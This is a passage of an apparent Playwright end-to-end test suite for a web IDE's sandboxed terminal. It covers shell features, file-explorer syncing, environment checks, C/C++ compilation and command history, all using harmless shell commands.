    await page.keyboard.type('mv src/App.tsx src/Main.tsx', { delay: 10 });
    await page.keyboard.press('Enter');

    // New name should appear
    const mainTsx = page.locator('.ide-scrollbar').getByText('Main.tsx');
    await expect(mainTsx).toBeVisible({ timeout: 15000 });
  });


  test('npm install triggered by package.json creation syncs node_modules correctly', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`NpmSync_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Npm_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Create a minimal package.json with a small dependency
    const pkgJson = '{"name":"test-pkg","version":"1.0.0","dependencies":{"is-odd":"3.0.1"}}';
    await page.keyboard.type(`echo '${pkgJson}' > package.json`, { delay: 5 });
    await page.keyboard.press('Enter');

    // Wait for watcher to detect package.json
    const pkgFile = page.locator('.ide-scrollbar').getByText('package.json');
    await expect(pkgFile).toBeVisible({ timeout: 15000 });

    // Manually run npm install to verify it works in the container
    await page.keyboard.type('npm install', { delay: 10 });
    await page.keyboard.press('Enter');

    // Wait for npm install to complete (should see "added X packages" or similar)
    await expect(terminalBody).toContainText(/added|up to date/i, { timeout: 30000 });

    // Verify node_modules exists in the container (but NOT in the explorer — it's excluded)
    await page.keyboard.type('ls node_modules/is-odd/index.js', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('node_modules/is-odd/index.js', { timeout: 5000 });

    // Verify the watcher EXCLUDES node_modules from the explorer
    // (node_modules should NOT appear in the sidebar file tree)
    const nodeModulesEntry = page.locator('.ide-scrollbar').getByText('node_modules', { exact: true });
    // Give it a brief window — it should NOT appear
    await page.waitForTimeout(5000);
    await expect(nodeModulesEntry).not.toBeVisible();
  });


});


test.describe('Terminal Pipe, Redirect & Advanced Shell Features', () => {

  test('supports pipes, redirects, here-docs, and command chaining', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Pipes_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Pipes_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Test pipe: echo | grep
    await page.keyboard.type('echo "apple banana cherry" | grep -o "banana"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('banana', { timeout: 5000 });

    // Test multi-pipe: generate, sort, filter
    await page.keyboard.type('echo -e "zeta\\nalpha\\nbeta" | sort | head -1', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('alpha', { timeout: 5000 });

    // Test append redirect (>>)
    await page.keyboard.type('echo "line1" > append_test.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "line2" >> append_test.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "line3" >> append_test.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('wc -l append_test.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    // Should show 3 lines
    await expect(terminalBody).toContainText('3', { timeout: 5000 });

    // Test command chaining with && and ||
    await page.keyboard.type('true && echo "CHAIN_AND_OK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('CHAIN_AND_OK', { timeout: 5000 });

    await page.keyboard.type('false || echo "CHAIN_OR_OK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('CHAIN_OR_OK', { timeout: 5000 });

    // Test stderr redirect (2>)
    await page.keyboard.type('ls /nonexistent 2> err.txt; cat err.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/No such file|cannot access/i, { timeout: 5000 });

    // Test command substitution
    await page.keyboard.type('echo "Today is $(date +%A)"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/Today is (Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday)/i, { timeout: 5000 });

    // Test exit codes
    await page.keyboard.type('false; echo "EXIT_CODE:$?"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('EXIT_CODE:1', { timeout: 5000 });
  });


  test('ANSI escape sequences and color codes render without corruption', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`ANSI_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `ANSI_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Print colored text using ANSI escape codes
    await page.keyboard.type('echo -e "\\033[31mRED_TEXT\\033[0m \\033[32mGREEN_TEXT\\033[0m \\033[34mBLUE_TEXT\\033[0m"', { delay: 5 });
    await page.keyboard.press('Enter');

    // The text content should appear (colors are rendered by xterm.js, text is preserved)
    await expect(terminalBody).toContainText('RED_TEXT', { timeout: 5000 });
    await expect(terminalBody).toContainText('GREEN_TEXT', { timeout: 5000 });
    await expect(terminalBody).toContainText('BLUE_TEXT', { timeout: 5000 });

    // Test cursor movement (should not corrupt the display)
    await page.keyboard.type('echo -e "ABCDEF\\033[3D***"', { delay: 10 });
    await page.keyboard.press('Enter');
    // \033[3D moves cursor 3 left, *** overwrites DEF → ABC***
    await expect(terminalBody).toContainText('ABC***', { timeout: 5000 });

    // Test clear screen (Ctrl+L) — terminal should stay functional
    await page.keyboard.press('Control+L');
    await page.waitForTimeout(500);
    await page.keyboard.type('echo "AFTER_CLEAR"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('AFTER_CLEAR', { timeout: 5000 });

    // Test tab completion (press Tab after partial command)
    await page.keyboard.type('ech', { delay: 10 });
    await page.keyboard.press('Tab');
    await page.waitForTimeout(300);
    await page.keyboard.type(' "TAB_COMPLETED"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('TAB_COMPLETED', { timeout: 5000 });
  });
});


test.describe('Terminal Working Directory Persistence & Navigation', () => {

  test('working directory persists across commands and supports complex navigation', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`CWD_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `CWD_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const workspaceId = page.url().split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Verify initial working directory
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // Create nested dirs and navigate
    await page.keyboard.type('mkdir -p deep/nested/path/here', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('cd deep/nested/path/here', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('deep/nested/path/here', { timeout: 5000 });

    // Use .. to go back
    await page.keyboard.type('cd ../..', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('deep/nested', { timeout: 5000 });

    // Use cd - to toggle between directories
    await page.keyboard.type('cd -', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('deep/nested/path/here', { timeout: 5000 });

    // Use absolute path to jump anywhere
    await page.keyboard.type(`cd /workspaces/${workspaceId}`, { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // Test ~ expansion (HOME dir)
    await page.keyboard.type('echo $HOME', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // Create file relative to cwd and verify
    await page.keyboard.type('cd deep && echo "RELATIVE_FILE" > from_nested.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('cat from_nested.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('RELATIVE_FILE', { timeout: 5000 });
  });
});


test.describe('Terminal Concurrent File Operations & Race Conditions', () => {

  test('rapid file creation burst from terminal all sync to explorer without data loss', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Burst_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Burst_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Burst-create 10 files in rapid succession using a for loop
    const burstCmd = 'for i in $(seq 1 10); do echo "content_$i" > "burst_file_$i.txt"; done';
    await page.keyboard.type(burstCmd, { delay: 5 });
    await page.keyboard.press('Enter');

    // Wait for watcher to pick up all 10 files (may take multiple scan cycles)
    // Each scan is 1.5s, so give it enough time for 3-4 cycles
    await page.waitForTimeout(8000);

    // Verify at least the first and last files appeared in the explorer
    const firstFile = page.locator('.ide-scrollbar').getByText('burst_file_1.txt');
    const lastFile = page.locator('.ide-scrollbar').getByText('burst_file_10.txt');
    await expect(firstFile).toBeVisible({ timeout: 10000 });
    await expect(lastFile).toBeVisible({ timeout: 10000 });

    // Verify content of one of the middle files
    const midFile = page.locator('.ide-scrollbar').getByText('burst_file_5.txt');
    await expect(midFile).toBeVisible({ timeout: 5000 });
    await midFile.click();
    await page.waitForSelector('.monaco-editor', { timeout: 25000 });
    await expect(page.locator('.monaco-editor')).toContainText('content_5', { timeout: 10000 });
  });


  test('simultaneous editor write and terminal write to different files does not conflict', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Race_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Race_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Create a file from terminal, then open it in editor
    await terminalTextarea.focus();
    await page.keyboard.type('echo "EDITOR_TARGET" > editor_file.js', { delay: 10 });
    await page.keyboard.press('Enter');

    // Wait for file to appear in explorer
    const editorFile = page.locator('.ide-scrollbar').getByText('editor_file.js');
    await expect(editorFile).toBeVisible({ timeout: 15000 });
    await editorFile.click();
    await page.waitForSelector('.monaco-editor', { timeout: 25000 });
    await expect(page.locator('.monaco-editor')).toContainText('EDITOR_TARGET', { timeout: 10000 });

    // Now type in the editor (Yjs becomes the source of truth for this file)
    await page.locator('.monaco-editor').first().click();
    await page.waitForTimeout(500);
    await page.keyboard.type('// EDITOR_ADDITION\n', { delay: 20 });
    await page.waitForTimeout(2000); // Let Yjs debounce fire

    // Simultaneously, create ANOTHER file from terminal (different file, should not conflict)
    await terminalTextarea.focus();
    await page.keyboard.type('echo "TERMINAL_SEPARATE" > terminal_file.js', { delay: 10 });
    await page.keyboard.press('Enter');

    // Verify terminal-created file syncs correctly
    const terminalFile = page.locator('.ide-scrollbar').getByText('terminal_file.js');
    await expect(terminalFile).toBeVisible({ timeout: 15000 });

    // Verify editor file still has the editor content (watcher should NOT overwrite Yjs-owned file)
    await editorFile.click();
    await page.waitForTimeout(1000);
    await expect(page.locator('.monaco-editor')).toContainText('EDITOR_ADDITION', { timeout: 10000 });

    // Open terminal_file.js in editor to verify its content
    await terminalFile.click();
    await page.waitForTimeout(1000);
    await expect(page.locator('.monaco-editor')).toContainText('TERMINAL_SEPARATE', { timeout: 10000 });
  });
});


test.describe('Terminal Environment & System Validation', () => {

  test('verifies container environment variables, resource limits, and system utilities', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Env_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Env_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const workspaceId = page.url().split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Verify TERM is set for xterm compatibility
    await page.keyboard.type('echo "TERM=$TERM"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('TERM=xterm-256color', { timeout: 5000 });

    // Verify HOME is set to workspace directory
    await page.keyboard.type('echo "HOME=$HOME"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(`HOME=/workspaces/${workspaceId}`, { timeout: 5000 });

    // Verify node is available
    await page.keyboard.type('node --version', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/v\d+\.\d+/, { timeout: 5000 });

    // Verify python is available
    await page.keyboard.type('python3 --version', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/Python \d+\.\d+/, { timeout: 5000 });

    // Verify gcc is available for C compilation
    await page.keyboard.type('gcc --version | head -1', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/gcc/i, { timeout: 5000 });

    // Verify the universal `run` script is accessible
    await page.keyboard.type('which run', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('/usr/local/bin/run', { timeout: 5000 });

    // Test `run` with a quick JavaScript file
    await page.keyboard.type('echo "console.log(42 * 2);" > calc.js', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('run calc.js', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('84', { timeout: 5000 });

    // Test `run` with Python
    await page.keyboard.type('echo "print(7 ** 3)" > power.py', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('run power.py', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('343', { timeout: 5000 });

    // Verify the custom PS1 prompt is rendering (contains 'sandbox')
    await page.keyboard.type('echo "PROMPT_CHECK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('sandbox', { timeout: 5000 });
  });


  test('compiles and runs C/C++ programs through the PTY correctly', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Compile_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Compile_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Write a C program
    const cProgram = '#include <stdio.h>\\nint main() { printf("C_OUTPUT_OK\\\\n"); return 0; }';
    await page.keyboard.type(`echo -e '${cProgram}' > hello.c`, { delay: 5 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(300);

    // Compile and run using the `run` universal script
    await page.keyboard.type('run hello.c', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('C_OUTPUT_OK', { timeout: 10000 });

    // Write a C++ program with STL usage
    const cppProgram = '#include <iostream>\\n#include <vector>\\nint main() { std::vector<int> v = {1,2,3}; std::cout << "CPP_VECTOR_SIZE:" << v.size() << std::endl; return 0; }';
    await page.keyboard.type(`echo -e '${cppProgram}' > test.cpp`, { delay: 5 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(300);

    await page.keyboard.type('run test.cpp', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('CPP_VECTOR_SIZE:3', { timeout: 15000 });

    // Test compilation error reporting
    await page.keyboard.type('echo "int main() { undeclared_var; }" > broken.c', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('run broken.c', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(/error|undeclared/i, { timeout: 10000 });
  });
});


test.describe('Terminal History & Shell State', () => {

  test('arrow keys navigate command history and shell maintains state across commands', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`History_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `History_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Type a sequence of commands to build history
    await page.keyboard.type('echo "HISTORY_CMD_1"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('HISTORY_CMD_1', { timeout: 5000 });

    await page.keyboard.type('echo "HISTORY_CMD_2"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('HISTORY_CMD_2', { timeout: 5000 });

    await page.keyboard.type('echo "HISTORY_CMD_3"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('HISTORY_CMD_3', { timeout: 5000 });

    // Press Up arrow to recall last command and execute it
    await page.keyboard.press('ArrowUp');
    await page.waitForTimeout(200);
    await page.keyboard.press('Enter');
    // Should re-execute "echo HISTORY_CMD_3" which produces HISTORY_CMD_3 again
    // (The terminal already has it, but we verify shell is responsive to arrow keys)

    // Press Up twice to get CMD_2, then execute
    await page.keyboard.press('ArrowUp');
    await page.waitForTimeout(100);
    await page.keyboard.press('ArrowUp');
    await page.waitForTimeout(100);
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Verify shell aliases and functions persist within the session
    await page.keyboard.type('alias ll="ls -la"', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('ll', { delay: 10 });
    await page.keyboard.press('Enter');
    // Should show directory listing (not "command not found")
    await expect(terminalBody).toContainText(/total|drwx/i, { timeout: 5000 });

    // Verify shell variables persist
    await page.keyboard.type('MY_VAR="PERSISTENT_VALUE"', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "CHECK:$MY_VAR"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('CHECK:PERSISTENT_VALUE', { timeout: 5000 });

    // Test bash history expansion (!!)
    await page.keyboard.type('echo "LAST_COMMAND_TEST"', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('!!', { delay: 10 });
    await page.keyboard.press('Enter');
    // !! should repeat the last command
    await page.waitForTimeout(1000);
    // Both outputs should be visible — just verify the original worked
    await expect(terminalBody).toContainText('LAST_COMMAND_TEST', { timeout: 5000 });
  });
});
